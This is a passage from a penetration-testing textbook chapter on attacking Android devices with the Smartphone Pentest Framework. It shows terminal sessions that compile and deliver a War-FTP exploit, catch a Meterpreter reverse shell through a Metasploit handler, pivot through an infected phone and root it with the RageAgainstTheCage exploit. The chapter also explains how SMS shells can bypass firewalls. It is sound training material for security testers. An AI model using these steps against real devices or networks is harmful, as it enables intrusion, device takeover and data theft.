spf&gt; <span class="strong"><strong>1</strong></span>❶&#13;
&#13;
Compiles C code to run on ARM based Android devices. Supply the C code file and the output filename&#13;
File to Compile: <span class="strong"><strong>/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c</strong></span>❷&#13;
Output File: <span class="strong"><strong>/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter</strong></span></pre></div></div><p>Select <code class="literal">1.) Compile C code for ARM Android</code> ❶. You will be prompted for the C file to compile as well as where you want to put the compiled binary ❷.</p><p>Now we need to download the War-FTP exploit to our infected Android device. From the agent commands menu, choose option <span class="strong"><strong><code class="literal">6</code></strong></span> to download a file. You will be asked for the file to download and the delivery method, as shown in <a class="xref" href="ch20.xhtml#downloading_the_exploit" title="Example 20-24. Downloading the exploit">Example 20-24</a>.</p><div class="example"><a id="downloading_the_exploit"/><div class="example-title">Example 20-24. Downloading the exploit</div><div class="example-contents"><pre class="programlisting">Select a command to perform or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>6</strong></span>&#13;
&#13;
    Downloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP).&#13;
File to download: <span class="strong"><strong>/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter</strong></span>&#13;
Delivery Method(SMS or HTTP): <span class="strong"><strong>HTTP</strong></span></pre></div></div><p>Before we run the exploit, we need to set up a handler in Msfconsole, as shown in <a class="xref" href="ch20.xhtml#setting_up_multisolidushandler" title="Example 20-25. Setting up multi/handler">Example 20-25</a>. Open Msfconsole on Kali, and use the <span class="emphasis"><em>multi/handler</em></span> module, setting the options to match the payload in the War-FTP exploit.</p><div class="example"><a id="setting_up_multisolidushandler"/><div class="example-title">Example 20-25. Setting up multi/handler</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use multi/handler</strong></span>&#13;
msf exploit(handler) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf exploit(handler) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf exploit(handler) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Starting the payload handler...</pre></div></div><p>Finally, it’s time to run the exploit. As shown in <a class="xref" href="ch20.xhtml#running_the_exploit-id00055" title="Example 20-26. Running the exploit">Example 20-26</a>, choose option <code class="literal">7.) Execute Command</code> from the agent commands menu; you will be prompted for the command to run.</p><div class="example"><a id="running_the_exploit-id00055"/><div class="example-title">Example 20-26. Running the exploit</div><div class="example-contents"><pre class="programlisting">Select a command to perform or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>7</strong></span>&#13;
&#13;
    Run a command in the terminal. Fill in the command and the delivery method(SMS or HTTP).&#13;
&#13;
Command: <span class="strong"><strong>warftpmeterpreter 192.168.20.10 21</strong></span>❶&#13;
Downloaded?: <span class="strong"><strong>yes</strong></span>❷&#13;
Delivery Method(SMS or HTTP): <span class="strong"><strong>HTTP</strong></span></pre></div></div><p><a class="indexterm" id="iddle1990"/>Tell SPF the full command, including arguments ❶. In this case, we need to tell the exploit the IP address and port to attack. SPF asks if the binary was downloaded. If it was downloaded through SPF, it will be in the agent’s files directory, and SPF will need to know to run it from there. In our case, we answer <span class="strong"><strong><code class="literal">yes</code></strong></span> ❷, then enter the delivery method as usual.</p><p>Watch your Metasploit listener. In about a minute you should receive a Meterpreter prompt like the one shown next.</p><a id="pro_id00225"/><pre class="programlisting">meterpreter &gt;</pre><p>We’ve successfully used SPF as a pivot to run an attack. This may not seem very exciting because the emulator, Kali, and the Windows XP target are all on the same network, but if Kali is in the cloud and the Windows XP target and an infected Android device are on the corporate network, this process would be more useful. We can make it more interesting by using command option <code class="literal">10.) TCP Listener</code> to set up a listener to catch our shell on the infected mobile device. Rather than calling back out to a listener on our Kali machine, we can instead send our shell back to SPF directly using either HTTP or SMS. Using SMS will, of course, allow us to completely bypass any perimeter filtering such as firewalls and proxies that may inhibit getting shells out of the network from your attacks. This is illustrated in <a class="xref" href="ch20.xhtml#bypassing_perimeter_controls_with_an_sms" title="Figure 20-5. Bypassing perimeter controls with an SMS-based shell.">Figure 20-5</a>.</p><div class="figure"><a id="bypassing_perimeter_controls_with_an_sms"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00203"/><img alt="Bypassing perimeter controls with an SMS-based shell." src="httpatomoreillycomsourcenostarchimages2030596.png.jpg"/></div></div><div class="figure-title">Figure 20-5. Bypassing perimeter controls with an SMS-based shell.</div></div><div class="note" title="Note"><h3 class="title"><a id="ch20note06"/>Note</h3><p><a class="indexterm" id="iddle1740"/><a class="indexterm" id="iddle2064"/>Aside from the privilege escalation example discussed next, there is no reason we needed to use Android 2.2 as our target emulator. The other malicious app examples we have used in this chapter will work on any version of Android.</p></div></div></div><div class="sect2" title="Privilege Escalation"><div class="titlepage"><div><div><h3 class="title" id="privilege_escalation">Privilege Escalation</h3></div></div></div><p>As a forked Linux kernel, Android shares some of Linux’s privilege escalation vulnerabilities, as well as having a few security mistakes of its own. Even OEMs have added bugs into their implementations of Android. For example, in 2012, a privilege-escalation vulnerability was found in how Samsung devices handled the camera memory if they used a certain kind of chip, giving attackers read/write access to all of memory.</p><p>If you want more permissions granted to your app, you can attempt to use a known issue from the agent to get root privileges, as shown in <a class="xref" href="ch20.xhtml#running_a_privilege-escalation_exploit" title="Example 20-27. Running a privilege-escalation exploit">Example 20-27</a>.</p><div class="example"><a id="running_a_privilege-escalation_exploit"/><div class="example-title">Example 20-27. Running a privilege-escalation exploit</div><div class="example-contents"><pre class="programlisting">Commands:&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Select a command to perform or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>5</strong></span>&#13;
    1.) Choose a Root Exploit&#13;
    2.) Let SPF AutoSelect&#13;
&#13;
Select an option or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>2</strong></span>❶&#13;
    Try a privilege escalation exploit.&#13;
&#13;
Chosen Exploit: rageagainstthecage❷&#13;
Delivery Method(SMS or HTTP): <span class="strong"><strong>HTTP</strong></span>❸</pre></div></div><p>From the agent commands menu, choose option <code class="literal">5.) Privilege Escalation</code>. From here we have two options. We can manually choose an exploit from the exploits for Android that SPF knows, or we can let SPF make a selection based on the Android version number. Our Android 2.2 emulator is vulnerable to an exploit known as Rage Against the Cage. Though this is an older exploit, it works well on the emulator, so let’s allow SPF to automatically select the exploit, as shown at ❶. Because this is Android 2.2, SPF correctly selects <code class="literal">rageagainstthecage</code> ❷ and asks for the delivery method ❸.</p><p>After giving the exploit a little time to run, check back with option <span class="strong"><strong><code class="literal">3</code></strong></span> from the main menu. The Rooted field should read <code class="literal">RageAgainstTheCage</code>, as shown here.</p><a id="pro_id00226"/><pre class="programlisting">Rooted: RageAgainstTheCage</pre><p>From here we have full control of the device. We can issue commands from a root shell or reinstall the agent as a system app, giving us even more privileges than the original app.</p><div class="note" title="Note"><h3 class="title"><a id="ch20note07"/>Note</h3><p>This particular exploit is a resource exhaustion attack, so if you want to continue using the emulator for additional exercises, you may want to restart it, as it may perform slower after this attack.</p></div></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00056" style="clear: both">Summary</h2></div></div></div><p>In this chapter, we took a brief look at the relatively new and rapidly evolving world of mobile exploitation. We used my SPF tool to run a variety of attacks, primarily on emulated Android mobile devices. These attacks will, of course, work on real devices in the same way. We looked at a remote attack that checked for a default SSH password on jailbroken iPhones, and then studied two client-side attack examples. One gave us a shell through a WebKit vulnerability in the browser, and the other remotely controlled the device through USSD codes that were automatically dialed from a web page.</p><p>We moved on to malicious applications, backdooring legitimate source code or compiled APK files with the SPF Android agent. We can use mobile-attack vectors such as NFC and SMS to trick users into installing our malicious app. Once the agent was installed, we ran attacks such as information gathering and remote control, and we used SPF to escalate our privileges to root using known vulnerabilities in the Android platform. Finally, we used the SPF agent as a pivot to attack other devices in the network. We ran Nmap from the Android device against our Windows XP target, and then used a C exploit for War-FTP to exploit the Windows XP target from the SPF agent.</p><p>Mobile device security is an exciting field that is adding new dimensions to pentesting as the devices enter the workplace. As a pentester, knowing a bit about mobile vulnerabilities will come in handy. As attackers use these devices to gain sensitive data and a foothold in the network, pentesters must be able to simulate these same threats.</p></div></section></body></html>